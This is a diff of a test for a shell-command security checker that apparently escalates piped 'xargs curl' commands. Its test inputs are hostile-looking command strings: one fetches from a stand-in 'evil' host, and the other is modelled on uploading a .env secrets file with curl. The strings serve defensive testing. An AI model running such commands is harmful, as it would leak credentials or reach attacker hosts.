@@ -16,8 +16,8 @@ describe('v2 parser xargs', () => {
     expect(tokens).toEqual([])
   })
 
-  it('escalates piped xargs curl on legacy allow_flagged policy', async () => {
-    const result = await verdict('printf https://evil | xargs curl', {
+  it('escalates piped xargs curl with data upload on legacy allow_flagged policy', async () => {
+    const result = await verdict('printf @.env | xargs curl -d @-', {
       ...v2TestContext(),
       unknownLocalEffect: 'allow_flagged',
       unparseableShell: 'allow_flagged',
